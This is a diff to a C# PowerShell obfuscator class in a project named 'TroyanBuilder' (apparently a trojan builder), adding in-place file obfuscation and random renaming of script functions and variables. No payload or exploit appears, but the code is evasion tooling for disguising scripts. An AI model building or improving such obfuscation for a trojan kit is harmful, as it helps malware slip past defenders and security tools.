@@ -1,32 +1,37 @@
-﻿using System.Collections.ObjectModel;
-using System.Management.Automation.Language;
+﻿using System.Management.Automation.Language;
 using System.Text;
 using System.Text.RegularExpressions;
 
 namespace TroyanBuilder
 {
-    public  class PowerShellObfuscator
+    public partial class PowerShellObfuscator
     {
-        private  readonly Random Random = new();
-        private  readonly Dictionary<string,Dictionary<string, string>> Renamed = new();
-        private  readonly HashSet<string> GeneratedNames = new();
+        private  readonly Dictionary<string,Dictionary<string, string>> RenamedVar = new();
+
+        public void ObfuscateFile(string psScriptFile)
+        {
+            var data  = File.ReadAllText(psScriptFile);
+            data = Obfuscate(data);
+            File.WriteAllText(psScriptFile, data);
+        }
 
         public string Obfuscate(string psScript)
         {
             var parsed = Parse(psScript);
             
+            FindAndRenameFunctions(parsed, "general");
+            psScript = Obfuscate(parsed);
+            parsed = Parse(psScript);
 
             FindAndRenameVariables(parsed, "general", false);
             psScript = Obfuscate(parsed);
             parsed = Parse(psScript);
             
+            
             ObfuscateFunctions(parsed, "general");
             psScript = Obfuscate(parsed);
             parsed = Parse(psScript);
             
-            // FindAndRenameFunctions(parsed, "general");
-            // psScript = Obfuscate(parsed);
-            // parsed = Parse(psScript);
      
             return psScript;
         }
@@ -101,7 +106,6 @@ namespace TroyanBuilder
                     }
                 }
                 
-
                 if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic || token.Kind == TokenKind.Variable || token.Kind == TokenKind.StringExpandable)
                 {
                     string tokenText = token.Text;
@@ -110,7 +114,7 @@ namespace TroyanBuilder
                         var variableNames = ExtractVariableNames(tokenText);
                         foreach (var variableName in variableNames)
                         {
-                            if (TryGetRenamed(scope, variableName, out var renamedVar))
+                            if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                             {
                                 tokenText = tokenText.Replace(variableName, renamedVar);
                             }
@@ -120,9 +124,21 @@ namespace TroyanBuilder
                     else if (token.Kind == TokenKind.Variable)
                     {
                         string variableName = tokenText.TrimStart('$');
-                        if (TryGetRenamed(scope, variableName, out var renamedVar))
+                        if (TryGetRenamedVar(scope, variableName, out var renamedVar))
                         {
                             sb.Append('$' + renamedVar);
+                        }
+                        else
+                        {
+                            sb.Append(tokenText);
+                        }
+                    }
+                    else if (token.Kind == TokenKind.Identifier && inScope)
+                    {
+                        string tokenName = tokenText;
+                        if (TryGetRenamedFunc(tokenName, out var renamedVar))
+                        {
+                            sb.Append(renamedVar);
                         }
                         else
                         {
@@ -132,9 +148,13 @@ namespace TroyanBuilder
                     else if (token.Kind == TokenKind.Identifier || token.Kind == TokenKind.Generic)
                     {
                         string tokenName = tokenText;
-                        if (TryGetRenamed(scope, tokenName, out var renamedVar))
+                        if (TryGetRenamedVar(scope, tokenName, out var renamedVar))
                         {
                             sb.Append(renamedVar);
+                        }
+                        else if (TryGetRenamedFunc(tokenName, out var renamedFunc))
+                        {
+                            sb.Append(renamedFunc);
                         }
                         else
                         {
@@ -211,57 +231,32 @@ namespace TroyanBuilder
       
     
                 var newname = info.IsParameter ? info.Name : GenerateRandomName();
-                AddRenamed(info.Scope, info.Name, newname);
+                AddRenamedVar(info.Scope, info.Name, newname);
             }
         }
         
-                        
-        private void FindAndRenameFunctions(Parsed parsed, string scope)
-        {
-            var funcs = parsed.Body.FindAll(x => x is FunctionDefinitionAst, false).Cast<FunctionDefinitionAst>();
-            foreach (var functionAst in funcs)
-            {
-                AddRenamed(scope, functionAst.Name, GenerateRandomName());
-            }
-        }
-
-
-        private void ObfuscateFunctions(Parsed parsed, string scope)
-        {
-            foreach (var functionAst in parsed.Body.FindAll(x => x is FunctionDefinitionAst, false).Cast<FunctionDefinitionAst>())
-            {
-                ObfuscateFunction(functionAst);
-            }
-        }
-
-        private void ObfuscateFunction(FunctionDefinitionAst functionAst)
-        {
-            var psScript = functionAst.Body.ToString();
-            var parsed = Parse(psScript);
-            FindAndRenameVariables(parsed, functionAst.Name, true);
-        }
-
-        private void AddRenamed(string scope, string name, string newName)
+     
+        private void AddRenamedVar(string scope, string name, string newName)
         {
             if (scope != "general")
             {
-                bool exists = TryGetRenamed("general", name, out var globalVar);
+                bool exists = TryGetRenamedVar("general", name, out var globalVar);
                 if (exists)
                 {
-                    Renamed.TryAdd(scope, new Dictionary<string, string>());
-                    Renamed[scope].TryAdd(name, globalVar);
+                    RenamedVar.TryAdd(scope, new Dictionary<string, string>());
+                    RenamedVar[scope].TryAdd(name, globalVar);
                     return;
                 }
             }
 
-            Renamed.TryAdd(scope, new Dictionary<string, string>());
-            Renamed[scope].TryAdd(name, newName);
+            RenamedVar.TryAdd(scope, new Dictionary<string, string>());
+            RenamedVar[scope].TryAdd(name, newName);
         }
-
-        private bool TryGetRenamed(string scope, string name, out string newName)
+        
+        private bool TryGetRenamedVar(string scope, string name, out string newName)
         {
             newName = name;
-            var got = Renamed.TryGetValue(scope, out var dict);
+            var got = RenamedVar.TryGetValue(scope, out var dict);
             if (!got)
                 return false;
             got = dict!.TryGetValue(name, out var x);
@@ -271,21 +266,5 @@ namespace TroyanBuilder
             return true;
         }
         
-        private string GenerateRandomName()
-        {
-            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            string randomName;
-
-            do
-            {
-                var len = Random.Shared.Next(17, 23);
-                randomName = new string(Enumerable.Repeat(chars, len).Select(s => s[Random.Next(s.Length)]).ToArray());
-            } 
-            while (GeneratedNames.Contains(randomName));
-
-            GeneratedNames.Add(randomName);
-
-            return randomName;
-        }
     }
 }
